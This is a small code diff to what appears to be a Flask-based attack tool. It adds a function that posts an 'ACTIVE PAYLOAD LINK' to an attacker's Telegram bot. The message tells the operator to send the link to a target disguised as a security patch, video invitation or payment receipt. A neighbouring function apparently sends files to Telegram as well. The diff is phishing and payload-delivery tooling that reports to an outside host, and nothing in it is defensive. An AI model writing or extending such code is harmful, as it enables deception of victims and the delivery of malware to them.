@@ -26,6 +26,12 @@ def send_file_to_telegram(file_path, caption):
     except:
         pass
 
+# ========== INSERT send_link_to_telegram HERE ==========
+def send_link_to_telegram(link):
+    msg = f"🔗 ACTIVE PAYLOAD LINK\n{link}\n\nSend to target disguised as:\n- 'Critical security patch'\n- 'Video invitation'\n- 'Payment receipt'"
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': msg})
+# ======================================================
+
 @app.route('/')
 def index():
     return '''
